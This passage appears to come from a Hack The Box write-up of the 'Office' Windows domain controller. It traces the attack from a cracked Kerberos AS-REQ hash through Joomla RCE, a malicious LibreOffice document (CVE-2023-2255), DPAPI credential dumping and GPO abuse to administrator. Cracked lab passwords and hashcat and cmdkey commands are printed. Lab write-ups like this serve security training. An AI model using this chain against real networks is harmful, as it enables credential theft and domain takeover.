<summary><b>SMB Shares</b></summary>
<div markdown="1">

~~~
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SOC Analysis    Disk
SYSVOL          Disk      Logon server share
~~~
</div>

</details>

Could not execute commands straight away with the dwolfe user.
[Impacket toolkit rce vk9-sec blog][vk9-sec]

Checking the `SOC Analysis` SMB share:
```
Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023
```

To analyze the pcap, we will use wireshark.  
Most of the time wireshark is the way to go tool, specially to get a good understand of the packets captured.  
If some advanced filtering is needed, tshark is a really good tool that can be combined with some regex mathing tool to get exactly what we need.  
The file contains a lot of TLS encrypted connection.  
There is a plain text smb connection, but it resolves to encrypted smb3.  
Kerberos AS-REQ packets found, it's possible to get the hash and bruteforce it.  
Three blogs were found during the research on how to get the hash from network packets.  
```
https://medium.com/@business1sg00d/as-req-roasting-from-a-router-2a216c801a2c
https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
https://blog.improsec.com/tech-blog/asreqroast-from-mitm-to-hash
```

I really recommend reading some Kerberos network packet analysis such as [robert.broeckelmann][robert-medium] to be familiared with the prototol.
![Wireshark KBR](/assets/2024-04-20-writeups-office-htb/krb_as-req_pcap.png "Wireshark KBR")

Creating a hash file and cracking it with hashcat
```
$ hashcat -a 0 -m 19900 tstark.hash ~/tools/lists/rockyou.txt

< ... SNIP ... >

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69

< ... SNIP ... >
```

Another password on hands, this time for the `tstark` user.  
In the Joomla dump, the Administrator name is Tony Stark.  
With this password it's possible to login into Joomla Administrator panel and perform a RCE.  
Following the [hacktricks joomla guide][ht-joomla] to execute a [reverse shell][ps-reverse]


### User web_account
<details>
<summary><b>Whoami</b></summary>
<div markdown="1">

~~~
USER INFORMATION
----------------

User Name          SID
================== =============================================
office\web_account S-1-5-21-1199398058-4196589450-691661856-1118


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
~~~
</div>

</details>

<details>
<summary><b>Systeminfo</b></summary>
<div markdown="1">

~~~
Host Name:                 DC
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-20165-01481-AA185
Original Install Date:     4/12/2023, 2:54:39 PM
System Boot Time:          6/22/2024, 2:44:44 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,480 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,174 MB
Virtual Memory: In Use:    1,625 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    office.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.11.3
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
~~~
</div>

</details>

Enumerating the `xampp server`, found more services running:
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2023   7:53 AM                administrator
d-----         1/30/2024   8:39 AM                internal
d-----          5/8/2023   3:10 PM                joomla
```

The administratos is just a log file with Joomla failed login attempts
The internal is a resume upload service.
Inspecting the php code.  
It only accept these extenions `array('docm','docx','doc','odt');`.  
The files are save to `C:\xampp\htdocs\internal\applications`.  
Looking for scheduled and processes that may process this folder contents
None interesting was found.  
The files one the folder are eventually erased.  
Listing installed applications.  
```
$ Get-WMIObject Win32_InstalledWin32Program | select Name, Version, ProgramId  

Name                                                               Version          ProgramId                           
----                                                               -------          ---------                           
Microsoft 365 Apps for enterprise - en-us                          16.0.17126.20132 00005344ced14ffe6e714b1a2fc12adc...
Microsoft OneDrive                                                 23.076.0409.0001 00008fb231529268e1232a4fdd301d5b...
Oracle VM VirtualBox Guest Additions 7.0.6                         7.0.6.155176     00002c8acd2d72476b3a5038242ab78c...
XAMPP                                                              8.0.28-0         000039a615f0261a8993886493c5974c...
LibreOffice 5.2.6.2                                                5.2.6.2          00006658248ec0073db3a252bc30b8d3...
VMware Tools                                                       12.0.6.20104755  00003bc0253577d228b9370783e1419f...
Microsoft Edge                                                     121.0.2277.112   000040cc1d0b11d4c51562216c85233d...
Microsoft Edge Update                                              1.3.183.29       0000d42b699b8322696d014b26533f01...
Microsoft Edge WebView2 Runtime                                    121.0.2277.112   00003bf23bde9cc9369da39bc1df1aa7...
Npcap                                                              1.71             00004eeb517eefaea87dc5cd5fd069f3...
Wireshark 4.0.5 64-bit                                             4.0.5            00001f5e09b9ed9b19505b9e3fcd33c4...
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31332 14.32.31332.0    0000309aacf735e65ef3867bc02c2e6c...
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133 14.29.30133.0    0000969fbe3ea7c0470836ab0cc8c14a...
Teams Machine-Wide Installer                                       1.5.0.30767      0000a8571596f0d284d93f5c20946e72...
Microsoft Search in Bing                                           2.0.2            0000e69baca32582bf26aefc45ba1980...
```

The LibreOffice installed on the system is vulnerable to [CVE-2023-2255][CVE-2023-2255] and has a [public exploit][CVE-2023-2255-exploit]
Creating the malicious ODT file with the same reverse shell used earlier and we got a shell

### User ppotts
<details>
<summary><b>Whoami</b></summary>
<div markdown="1">

~~~
USER INFORMATION
----------------

User Name     SID
============= =============================================
office\ppotts S-1-5-21-1199398058-4196589450-691661856-1107


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
~~~
</div>

</details>

With ppotts user, another approach was taken to escalate privileges.  
Following the [windows privillege escalation hacktricks cheatsheet][ht-windows-privesc]
Cached passwords found with cmdkey:
```
$ cmdkey /list
Target: Domain:interactive=office\hhogan
Type: Domain Password
User: office\hhogan
```

Dumping the password using DPAPI.  
Both of the following guides were used:  
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
```

HHogan creds:
```
UserName       : OFFICE\HHogan
CredentialBlob : H4ppyFtW183#
```

Using [RunasCs][runas-cs] tool to login as HHogan.  
This tool is pretty good as it helps a lot with UAC bypass.  

### User HHogan
<details>
<summary><b>Whoami</b></summary>
<div markdown="1">

~~~
USER INFORMATION
----------------

User Name     SID
============= =============================================
office\hhogan S-1-5-21-1199398058-4196589450-691661856-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
~~~
</div>

</details>

GPO Managers group can be use for GPO Abuse and gain administrator.  
Using [SharpView][sharpview] to see the GPOs.  
Exploiting with [SharpGPOAbuse][gpo-abuse] and adding hhogan to administrator group.  
SharpGPOAbuse had to be compile manually.  
It is way easier to have a Windows 10 virtual machine and compile right away.  




[ht-joomla]: <https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla> "Hacktricks Joomla"
[CVE-2023-23752]: <https://nvd.nist.gov/vuln/detail/CVE-2023-23752> "CVE-2023-23752"
[CVE-2023-23752-exploit]: <https://github.com/AlissonFaoli/CVE-2023-23752> "CVE-2023-23752 Exploit"
[enum4linux-ng]: <https://github.com/cddmp/enum4linux-ng> "enum4linux-ng"
[vk9-sec]: <https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/> "vk9-sec"
[robert-medium]: <https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a> "Kerberos Network"
[ps-reverse]: <https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3> "PS Reverse"
[runas-cs]: <https://github.com/antonioCoco/RunasCs> "RunasCs"
[CVE-2023-2255]: <https://nvd.nist.gov/vuln/detail/CVE-2023-2255> "CVE-2023-2255"
[CVE-2023-2255-exploit]: <https://github.com/elweth-sec/CVE-2023-2255> "CVE-2023-2255"
[ht-windows-privesc]: <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation> "Windows Local Privilege Escalation"
[sharpview]: <https://github.com/tevora-threat/SharpView> "SharpView"
[gpo-abuse]: <https://github.com/FSecureLABS/SharpGPOAbuse> "SharpGPOAbuse"
